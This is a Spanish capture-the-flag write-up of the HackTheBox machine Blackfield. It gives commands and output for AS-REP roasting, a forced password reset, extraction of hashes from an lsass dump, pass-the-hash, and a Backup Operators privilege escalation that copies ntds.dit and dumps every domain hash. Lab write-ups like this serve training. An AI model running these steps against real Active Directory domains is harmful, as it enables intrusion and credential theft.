---
layout: single
title: Blackfield HTB - WriteUp
excerpt: WriteUp de la máquina Blackfield de HTB.
date: 2023-03-01
classes: wide
header:
  teaser: /assets/images/Blackfield/Blackfield.png
  teaser_home_page: true
  icon: /assets/images/Blackfield/Blackfield.png
categories:
  - infosec
tags:
  - ctf
  - Windows                                                                                                                                                                                 
  - Writeup
  - SMB-Enumeration                                                                                                                                                                                  
  - ASREPRoast                                                                                                                                                                                    
  - ForceChangePassword
  - LSASS-DUMP
  - Backup-Operators
---

En el día de hoy estaremos resolviendo la máquina Knife de HackTheBox. Es una máquina Windows y su dirección IP es 10.10.10.192.

### Índice

1. [Ennumeración Inicial](#enumeración-inicial)
2. [ASREPRoast Attack](#asreproast-attack)
3. [ForceChangePassword](#forcechangepassword)
4. [LSASS Dump](#lsass-dump)
5. [Backup Operators Privesc](#backup-operators-privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.


```bash
❯ nmap -sC -sV -Pn -oN Extraction -p53,88,135,389,445,593,3268,5985 10.10.10.192
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-01 08:51 CET
Stats: 0:00:52 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.44% done; ETC: 08:52 (0:00:00 remaining)
Nmap scan report for 10.10.10.192
Host is up (0.096s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-01 15:51:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m57s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-01T15:51:31
|_  start_date: N/A
```

Estamos ante un dominio que tiene expuestos puertos interesantes:

- Puerto 53 (DNS)
- Puerto 88 (Kerberos)
- Puerto 135 (RPC)
- Puerto 389,3268 (LDAP)
- Puerto 445 (SMB)
- Puerto 5985 (WinRM)

He añadido al /etc/hosts BLACKFIELD.local y dc01.blackfield.local . Lo primero que intenté enumerar fué el SMB en busqueda de recursos compartidos.

Podía listar varios recursos...

```bash
❯ smbclient -L '\\10.10.10.192\' -N
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Con CrackMapExec miré los permisos que tenía en cada recurso.

```bash
❯ crackmapexec smb 10.10.10.192 -u 'null' -p '' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\null: 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
```

Fuí a enumerar profiles$ porque en IPC$ normalmente (y en este caso también) no se puede listar el contenido.

### ASREPRoast Attack

Al acceder a profiles$ me encontré con una lista enorme de usuarios... Ya estaba pensando en un  ASREPRoast. Lo que hice fué guardar los usuarios en un archivo.

```bash
❯ smbclient '\\10.10.10.192\profiles$' -N -c 'dir' | tee users                                                                                                                                         
  .                                   D        0  Wed Jun  3 18:47:12 2020                                                                                                                   
  ..                                  D        0  Wed Jun  3 18:47:12 2020                                                                                                                   
  AAlleni                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ABarteski                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ABekesz                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ABenzies                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AChampken                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ACheretei                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ACsonaki                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AHigchens                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AJaquemai                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AKlado                              D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AKoffenburger                       D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AKollolli                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AKruppe                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AKubale                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ALamerz                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AMaceldon                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AMasalunga                          D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ANavay                              D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ANesterova                          D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ANeusse                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AOkleshen                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  APustulka                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ARotella                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ASanwardeker                        D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AShadaia                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ASischo                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ASpruce                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ATakach                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ATaueg                              D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  ATwardowski                         D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  audit2020                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AWangenheim                         D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AWorsey                             D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  AZigmunt                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  BBakajza                            D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  BBeloucif                           D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  BCarmitcheal                        D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  BConsultant                         D        0  Wed Jun  3 18:47:11 2020                                                                                                                   
  BErdossy                            D        0  Wed Jun  3 18:47:11 2020 
  [..SNIP..]
```

Transformamos el formato para quedarnos unicamente con los usuarios.

```bash
❯ cat users | cut -d ' ' -f 3 > users.txt
```

Ahora podemos efectuar el ASREPRoast. Para ello usaremos la herramienta de impacket "impacket-GetNPUsers"

```bash
❯ impacket-GetNPUsers BLACKFIELD.local/ -usersfile users.txt -dc-ip 10.10.10.192 -request
```

> Este ataque se aprovecha de los usuarios que no necesitan una pre-autenticación en Kerberos. Sin necesidad de conocer credenciales podemos solicitar un TGT que posteriormente podemos intentar romper con herramientas como john.

Al lanzar el ataque podemos extraer el hash de uno de los usuarios:

```bash
$krb5asrep$23$support@BLACKFIELD.LOCAL:5ff9914f3664d8ea565fdfb3efcbdf11$fbc22a7d1ebbb784ed8a4c2eeb5ebcb369f806e7da93331c29310f4efd2914be57f60c259b0492793ab0876f4a1920b039390d849079a3a66f674
f905f69c5efbd28732f749f77f4f303cbcd175e3d02390d47bf9cf328d9bd2b41bf11cb1bf8bca9a571cec12a95634d6b66716592f3f842c17a035406bece0998e53592784a42f7a522837d1338473a5b17b5ac0c77fa2d3fb66de845acb7
a00dc1838f13a32a208a26febdff5a77358b78a5a741a952ebd2d8061f78633b9a474371723d2297b041ac5c203303516b12b636b5149e5a3907d1d3b2021a720e9f5455289f5935f954a454f664b473faec962fc4b404ba38e82e
```

Podemos intentar romper el TGT cifrado "\$krb5asrep$23\$" del usuario support y extraer la contraseña. Para esto podemos usar herramientas como john o hashcat.

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:11 DONE (2023-03-01 09:19) 0.08841g/s 1267Kp/s 1267Kc/s 1267KC/s #1WIF3Y..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Ya tenemos un usuario (support) y una contraseña (#00^BlackKnight). Vamos a probar una serie de cosas para tratar de acceder a la máquina o escalar privilegios.

No se puede usar WinRM con el usuario que tenemos:

```bash
❯ crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
WINRM       10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [-] BLACKFIELD.local\support:#00^BlackKnight
```

Por lo tanto aún no podemos acceder a la máquina porque tampoco tenemos permisos de escritura en recursos compartidos para ganar acceso con herramientas como psexec.

### ForceChangePassword

No había ningún recurso compartido que me sea de utilidad. Fuí a enumerar con BloodHound por si me decía algo más de utilidad.

```bash
❯  python3 bloodhound.py -c ALL -u 'support' -p '#00^BlackKnight' -d 'BLACKFIELD.local' -ns 10.10.10.192
```

Si importamos los datos en BloodHound podemos ver cosas interesantes:

![](/assets/images/Blackfield/img1.png)

Eso quiere decir que el usuario Support tiene permisos para cambiarle la contraseña al usuario audit2020.

Podemos usar herramientas como rpcclient para abusar de eso.

```bash
rpcclient \$\> setuserinfo2 audit2020 23 'Testing123!'
rpcclient \$\>
```

Le hemos cambiado la password al usuario "audit2020", si listamos los recursos compartidos a los que tenemos acceso podemos ver un recurso nuevo:

```bash
❯ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'Testing123!' --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:Testing123! 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
```

### LSASS Dump

El recurso "forensic" antes no estaba disponible, vamos a ver su contenido.

```bash
❯ smbclient '\\10.10.10.192\forensic' -U audit2020
Enter WORKGROUP\audit2020's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 14:03:16 2020
  ..                                  D        0  Sun Feb 23 14:03:16 2020
  commands_output                     D        0  Sun Feb 23 19:14:37 2020
  memory_analysis                     D        0  Thu May 28 22:28:33 2020
  tools                               D        0  Sun Feb 23 14:39:08 2020

                5102079 blocks of size 4096. 1694300 blocks available
smb: \> 
```

Tiene cosas interesantes relacionadas con Forensics, pero lo que más me llama la atención es un fichero .zip que se encuentra dentro de  "memory_analysis" llamado "lsass.zip". Nos lo vamos a descargar a nuestro equipo.

> El proceso LSASS es responsable de la autenticación y verificación de credenciales de usuario, la gestión de políticas de seguridad local, el control de acceso a recursos del sistema y la creación de tokens de seguridad para los usuarios que se autentican correctamente.

```bash
smb: \memory_analysis\> dir
  .                                   D        0  Thu May 28 22:28:33 2020
  ..                                  D        0  Thu May 28 22:28:33 2020
  conhost.zip                         A 37876530  Thu May 28 22:25:36 2020
  ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020
  dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020
  dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020
  ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020
  lsass.zip                           A 41936098  Thu May 28 22:25:08 2020
  mmc.zip                             A 64288607  Thu May 28 22:25:25 2020
  RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020
  ServerManager.zip                   A 131983313  Thu May 28 22:26:49 2020
  sihost.zip                          A 33141744  Thu May 28 22:27:00 2020
  smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020
  svchost.zip                         A 14408833  Thu May 28 22:27:19 2020
  taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020
  winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020
  wlms.zip                            A  4067425  Thu May 28 22:27:44 2020
  WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020

                5102079 blocks of size 4096. 1694300 blocks available
smb: \memory_analysis\> get lsass.zip
```

Si descomprimimos el .zip podemos ver un archivo llamado: "lsass.DMP"

```bash
❯ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP               
❯ ls
lsass.DMP 
```

Este archivo se puede Dumpear y extraer los hash NT de los usuarios, para posteriormente hacer PassTheHash. Para dumpearlo podemos usar herrmamientas como mimikatzs, yo voy a usar pypykatz

```bash
❯ pypykatz lsa minidump lsass.DMP | tee dumping
```

Si miramos el contenido de dumping podemos ver un montón de entradas, yo solo quiero los hash NT lo siguiente:

```bash
❯ cat dumping | grep "NT:" | cut -d ':' -f2 > nt-hash
❯ catn nt-hash
 9658d1d1dcd9250115e2205d9f48400d
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 9658d1d1dcd9250115e2205d9f48400d
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
 b624dc83a27cc29da11d9bf25efea796
```

Podemos ver lineas repetidas, vamos a eliminar las repeticiones:

```bash
❯ sort nt-hash | uniq
 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
 9658d1d1dcd9250115e2205d9f48400d
 b624dc83a27cc29da11d9bf25efea796
```

Si miramos los propietarios de los hash podemos ver que les pertenece:

```bash
luid 153705
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
```

Si probamos a hacer PassTheHash con estos usuarios y hashes podemos ver lo siguiente:

```bash
❯ crackmapexec smb 10.10.10.192 -u 'Administrator' -H '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
❯ crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
```

Bien! Podemos usar el hash de svc_backup para autenticarnos. Vamos a ver si este usuario tiene permisos para conectarse por WinRM.

```bash
❯ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
WINRM       10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
```

Podemos! Nos autenticaremos con evil-winrm para ganar una shell.

```powershell
❯ evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents\>
```

### Backup Operators Privesc

Es hora de escalar privilegios. Si miramos nuestros privs y nuestros grupos podemos darnos cuenta de que pertenecemos al grupo "Backup Operators" y tenemos permisos de "SeBackupPrivilege"

Podemos aprovecharnos de esto para hacer un backup de SAM, NTDS y de SYSTEM para posteriormente extraer un listado de hash NTLM para hacer PassTheHash y ganar acceso como administrador.

Para aprovecharnos de  esto tendremos que crearnos un archivo .txt con el siguiente contenido (Importante al final de cada linea dar un espacio).

```bash
❯ catn diskshadow.txt
set metadata C:\tmp\tmp.cabs 
set context persistent nowriters 
add volume c: alias someAlias 
create  
expose %someAlias% z: 
```

Ahora tenemos que subir ese archivo a la máquina víctima (si estas usando evil-winrm puedes usar la función upload). Una vez lo tengamos subido con diskshadow.exe le pasaremos ese archivo y nos creará una copia del sistema de archivos en Z:

```powershell
*Evil-WinRM* PS C:\tmp\> diskshadow.exe /s .\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  3/1/2023 9:23:23 AM

-\> set metadata C:\tmp\tmp.cabs
-\> set context persistent nowriters
-\> add volume c: alias someAlias
-\> create
Alias someAlias for shadow ID {09f7232c-9faa-48f5-bd6a-29649902e91b} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7d29a1c1-16f8-4e1a-9a37-b6371c43c19a} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7d29a1c1-16f8-4e1a-9a37-b6371c43c19a}

        * Shadow copy ID = {09f7232c-9faa-48f5-bd6a-29649902e91b}               %someAlias%
                - Shadow copy set: {7d29a1c1-16f8-4e1a-9a37-b6371c43c19a}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 3/1/2023 9:23:24 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-\> expose %someAlias% z:
-\> %someAlias% = {09f7232c-9faa-48f5-bd6a-29649902e91b}
The shadow copy was successfully exposed as z:\.
-\>
```

Ahora tenemos que importar dos .dll:

- https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

- https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

Nos las bajamos y las subimos a la máquina. Una vez en la máquina, lo importamos.

```powershell
*Evil-WinRM* PS C:\tmp\> import-module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\tmp\> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\tmp\>
```

Ahora podemos hacer uso de la función "copy-filesebackupprivilege" para crear un backup de NTDS para sacar el contenido de NTDS nos hace falta SYSTEM.

```powershell
*Evil-WinRM* PS C:\tmp\> copy-filesebackupprivilege z:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
*Evil-WinRM* PS C:\tmp\> reg save HKLM\SYSTEM C:\tmp\system
The operation completed successfully.
```

```powershell
*Evil-WinRM* PS C:\tmp\> dir
    Directory: C:\tmp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/1/2023   9:22 AM            127 diskshadow.txt
-a----         3/1/2023   9:30 AM       18874368 ntds.dit
-a----         3/1/2023   9:27 AM          12288 SeBackupPrivilegeCmdLets.dll
-a----         3/1/2023   9:27 AM          16384 SeBackupPrivilegeUtils.dll
-a----         3/1/2023   9:30 AM       17580032 system
-a----         3/1/2023   9:23 AM            633 tmp.cabs
```

Ahora nos tendremos que bajar los archivos "ntds.dit" y "system" como estamos en evil-winrm podemos usar la función download. La descarga de estos ficheros puede tardar...

Cuando tenemos los dos archivos podemos hacer uso de secretsdump para dumpear los datos.

```bash
❯ secretsdump.py LOCAL -system system -ntds ntds.dit                                                                                                                                         
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                                                                                                     
                                                                                                                                                                                             
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                                                                                                                
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                
[*] Searching for pekList, be patient                                                                                                                                                        
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                                                                                            
[*] Reading and decrypting hashes from ntds.dit                                                                                                                                              
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                                                                                                       
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                               
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:2a2f8ac26db968c93a17fefdb36c38ee:::                                                                                                              
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                                                                                                              
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::                                                                                                          
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212::: 
```

Ahora podemos usar el hash del Administrador para hacer PassTheHash y convertirnos en administradores del dominio.

```bash
❯ crackmapexec smb 10.10.10.192 -u 'Administrator' -H '184fb5e5178480be64824d4cd53b99ee'
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\Administrator 184fb5e5178480be64824d4cd53b99ee (Pwn3d!)
```

Espero que te haya servido!













